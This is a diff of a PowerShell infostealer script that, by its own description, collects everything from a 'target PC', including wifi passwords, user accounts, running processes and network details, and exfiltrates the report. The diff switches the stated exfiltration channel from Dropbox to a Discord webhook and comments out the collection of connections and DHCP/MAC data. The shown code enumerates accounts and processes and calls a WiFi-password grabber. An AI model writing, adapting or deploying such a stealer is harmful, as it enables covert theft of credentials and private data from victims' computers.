@@ -4,7 +4,7 @@
 #DESCRIPTION 
 	#This program gathers details from target PC to include everything you could imagine from wifi passwords to PC specs to every process running
 	#All of the gather information is formatted neatly and output to a file 
-	#That file is then exfiltrated to cloud storage via DropBox
+	#That file is then exfiltrated to Discord Webhook
 
 #>
 
@@ -121,7 +121,7 @@ try {
 }
 
 # Check if DHCP is enabled and retrieve the MAC address
-$IsDHCPEnabled = $false
+<# $IsDHCPEnabled = $false
 try {
     $Networks = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.DHCPEnabled -eq $true }
     if ($Networks) {
@@ -133,6 +133,7 @@ try {
 } catch {
     $MAC = "Error getting MAC address"
 }
+#>
 
 # Retrieve Network Info
 try {
@@ -149,13 +150,13 @@ try {
 }
 
 # **Step 2: Active Connections and Listeners**
-try {
+<# try {
     $activeConnections = Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State
     $ConnectionsInfo = ($activeConnections | Out-String)
 } catch {
     $ConnectionsInfo = "Failed to retrieve active TCP connections."
 }
-
+#>
 ############################################################################################################################################################
 
 # Get System Information
@@ -195,7 +196,7 @@ Hostname: $HostName
 Public IP: $computerPubIP
 Local IP(s): $localIP
 MAC Address: $MAC
-DHCP Enabled: $IsDHCPEnabled
+DHCP Enabled: $IsDHCPEnabled 
 
 System Details:
 $SystemDetails
@@ -270,7 +271,7 @@ $luser=Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Na
 $process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
 
 # Get Listeners / ActiveTcpConnections
-$listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
+<# $listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
 $listener = $listener | foreach-object {
     $listenerItem = $_
     $processItem = ($process | where { [int]$_.Handle -like [int]$listenerItem.OwningProcess })
@@ -283,7 +284,7 @@ $listener = $listener | foreach-object {
       "ProcessName" = $processItem.ProcessName
     }
 } | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table 
-
+#>
 # process last
 $process = $process | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine
 
@@ -447,7 +448,7 @@ $WiFiPasswords = Get-WifiPasswords
 $computerPubIP
 $localIP
 $MAC
-$IsDHCPEnabled
+#$IsDHCPEnabled
 
 $SystemInfo = @"
 User: $FullName
